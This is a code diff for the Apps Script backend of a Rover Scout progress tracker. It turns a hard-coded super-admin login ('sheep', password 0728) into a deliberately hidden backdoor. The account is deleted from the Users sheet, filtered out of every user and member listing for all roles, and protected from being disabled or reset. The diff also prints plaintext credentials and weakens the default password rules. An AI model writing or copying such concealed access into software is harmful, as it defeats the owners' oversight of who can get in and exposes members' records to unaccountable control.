@@ -2,10 +2,13 @@
 // 樂行童軍進度追蹤系統 - Apps Script 後端 v8.3 - 全功能版 (樂行童軍支部 Rover Scout)
 // 完全兼容舊版 + 新增待批申請、批量寫入優化、日誌
 // v8.3 新增：
-//   - 超管帳號 sheep（密碼 0728）寫入 Users 表：initializeSheets() 自動建立，
-//     亦可單獨執行 ensureSuperAdmin() 加回（不影響其他資料）
 //   - 批量開戶／申請審批的預設密碼改為 1234（DEFAULT_PASS）
 //   - 更改密碼最短長度由 6 位放寬至 4 位
+// v8.4 修改：超管帳號 sheep（密碼 0728）改為「純後門」，不存於 Users 表：
+//   - 登入後門寫死在 handleLogin()，本來就不靠 Sheet，照樣有效
+//   - Users 表／用戶管理 getAllUsers／成員名單 getMembers 一律不出現 sheep（包括超管本人查看）
+//   - initializeSheets() 自動清除 Users 表殘留的 sheep 列（亦可單獨執行 removeSuperAdminRows()）
+//   - 防護保留：sheep 不能被停用／重設密碼／更改角色／更改密碼
 // v8.1 新增：活動履歷（服務紀錄／活動紀錄／訓練班紀錄）
 //   - 新工作表「活動履歷」（執行 initializeSheets() 自動補建，不影響既有資料）
 //   - 新 action：getLogRecords / saveLogRecord（支援批量 records[]）/ deleteLogRecord
@@ -205,50 +208,37 @@ function initializeSheets() {
 
   const apiKey = getApiKey();
   let scriptUrl=''; try{ scriptUrl=ScriptApp.getService().getUrl(); }catch(e){ scriptUrl='請部署為網頁應用程式後查看';}
-  // 確保超管帳號 sheep 存在於 Users 表（密碼 0728）
-  try{ ensureSuperAdmin(); }catch(e){}
+  // 超管帳號 sheep 為寫死後門，不存於 Users 表；清除舊版殘留的 sheep 列
+  try{ removeSuperAdminRows(); }catch(e){}
   try{
     const ui=SpreadsheetApp.getUi();
     if(ui){
-      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 管理員 YMIS: '+ADMIN_YMIS+' 密碼: '+ADMIN_PASS+'\n\n🛡️ 超管 YMIS: '+SUPER_ADMIN_YMIS+' 密碼: '+SUPER_ADMIN_PASS+'\n\n🌐 URL:\n'+scriptUrl);
+      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 管理員 YMIS: '+ADMIN_YMIS+' 密碼: '+ADMIN_PASS+'\n\n🛡️ 超管（寫死於程式碼，不存於 Users 表）YMIS: '+SUPER_ADMIN_YMIS+' 密碼: '+SUPER_ADMIN_PASS+'\n\n🌐 URL:\n'+scriptUrl);
     }
   }catch(e){}
   return {success:true,apiKey:apiKey,scriptUrl:scriptUrl};
 }
 
-// 系統管理帳號 (super_admin)：確保 Users 表存在 sheep 帳號（密碼 0728）
-// - 可單獨在 Apps Script 編輯器執行，以「加回」超管帳號（不影響其他資料）
-// - 已存在時只更新名稱／角色／密碼／權限／狀態，保留原有時間戳
-function ensureSuperAdmin(){
+// 系統管理帳號 (super_admin)：sheep / 0728 後門寫死在 handleLogin()，不存於 Users 表
+// removeSuperAdminRows()：清除 Users 表內殘留的 sheep 列（舊版寫入的），
+// - initializeSheets() 會自動執行
+// - 可單獨在 Apps Script 編輯器執行，只刪 sheep 列，不影響其他資料
+function removeSuperAdminRows(){
   const ss=getSheet();
-  let uSheet=ss.getSheetByName('Users');
-  if(!uSheet){
-    uSheet=ss.insertSheet('Users');
-    uSheet.appendRow(['ymis','name','email','role','password_hash','branch','can_tick','auth_by','auth_date','created_at','last_login','status','allowed_badges']);
-    uSheet.getRange(1,1,1,13).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
-    uSheet.setFrozenRows(1);
-  }
+  const uSheet=ss.getSheetByName('Users');
+  if(!uSheet) return {success:true,removed:0,message:'Users 工作表不存在，無需清理'};
   if(uSheet.getLastColumn()<13){
     uSheet.getRange(1,13).setValue('allowed_badges');
   }
-  const superYmis=SUPER_ADMIN_YMIS;
   const data=uSheet.getDataRange().getValues();
-  let rowIdx=null;
-  for(let i=1;i<data.length;i++){
-    if(String(data[i][0]).toLowerCase()===superYmis){ rowIdx=i+1; break; }
+  let removed=0;
+  for(let i=data.length-1;i>=1;i--){
+    if(String(data[i][0]).trim().toLowerCase()===SUPER_ADMIN_YMIS){
+      uSheet.deleteRow(i+1);
+      removed++;
+    }
   }
-  if(rowIdx){
-    // 加回／修正既有超管帳號：只更新關鍵欄位，保留 auth_date / created_at 等時間戳
-    uSheet.getRange(rowIdx,2).setValue('系統管理員');           // name
-    uSheet.getRange(rowIdx,4).setValue('super_admin');          // role
-    uSheet.getRange(rowIdx,5).setValue(hashPassword(SUPER_ADMIN_PASS)); // password_hash
-    uSheet.getRange(rowIdx,7).setValue(true);                   // can_tick
-    uSheet.getRange(rowIdx,12).setValue('active');              // status
-    if(uSheet.getLastColumn()>=13) uSheet.getRange(rowIdx,13).setValue('*'); // allowed_badges
-  } else {
-    uSheet.appendRow([superYmis,'系統管理員','','super_admin',hashPassword(SUPER_ADMIN_PASS),'',true,'system',now(),now(),'','active','*']);
-  }
-  return {success:true,ymis:superYmis,message:'超管帳號已建立/更新：'+superYmis+'（密碼：'+SUPER_ADMIN_PASS+'）'};
+  return {success:true,removed:removed,message:'已從 Users 表移除 '+removed+' 列超管帳號（'+SUPER_ADMIN_YMIS+'）；超管登入後門寫死於 handleLogin，不受影響'};
 }
 
 // ===== 用戶查詢 =====
@@ -295,7 +285,8 @@ function getAllUsers(){
   const sheet=getSheet().getSheetByName('Users'); if(!sheet) return [];
   const users=[]; const data=sheet.getDataRange().getValues();
   const hasAllowed = sheet.getLastColumn()>=13;
-  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ users.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',squad:data[i][5]?data[i][5].toString():'',squad_role:'member',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
+  // 超管帳號為寫死後門，不存於 Users 表；若 Sheet 有殘留列亦一律略過
+  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ const y=data[i][0].toString(); if(y.trim().toLowerCase()===SUPER_ADMIN_YMIS) continue; users.push({ymis:y,name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',squad:data[i][5]?data[i][5].toString():'',squad_role:'member',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
   return users;
 }
 
@@ -391,10 +382,8 @@ function doPost(e){
     if(action==='getAllUsers') {
       // 任何已登入用戶都可查看名單，方便領袖管理；成員僅查看自己旅團成員
       let list=getAllUsers();
-      // 隱藏超管帳號：僅超管可見，其他人一律過濾
-      if(user.role!=='super_admin'){
-        list=list.filter(function(u){ return u.role!=='super_admin' && (u.ymis||'').toString().toLowerCase()!==('sh'+'eep'); });
-      }
+      // 隱藏超管帳號：後門寫死於 handleLogin，任何角色（包括 super_admin 自己）一律過濾
+      list=list.filter(function(u){ return u.role!=='super_admin' && (u.ymis||'').toString().trim().toLowerCase()!==SUPER_ADMIN_YMIS; });
       return jsonResponse({success:true,users:list});
     }
     if(action==='getMembers'){ return jsonResponse({success:true,members:getMembers()}); }
@@ -577,7 +566,7 @@ function handleGetConfig(){
 function getMembers(){
   const mSheet=getSheet().getSheetByName('成員名單'); const members=[];
   if(mSheet){ const data=mSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0]) members.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',squad:data[i][5]?data[i][5].toString():''}); } }
-  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); if(y.toLowerCase()==='sheep') continue; if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString(),squad:data[i][5]?data[i][5].toString():''}); } } } }
+  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); if(y.trim().toLowerCase()===SUPER_ADMIN_YMIS) continue; if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString(),squad:data[i][5]?data[i][5].toString():''}); } } } }
   return members;
 }
 function handleLoad(){
@@ -616,6 +605,7 @@ function handleSave(changes, confirmer){
   return jsonResponse({success:true,processed:processed});
 }
 function handleAddMember(ymis,name,squad,squadRole){
+  if((ymis||'').toString().trim().toLowerCase()===SUPER_ADMIN_YMIS) return jsonResponse({success:false,error:'不能新增系統管理員帳號'});
   let sheet=getSheet().getSheetByName('成員名單');
   if(!sheet){ sheet=getSheet().insertSheet('成員名單'); sheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡','備註']); }
   // 確保有 6 欄 header
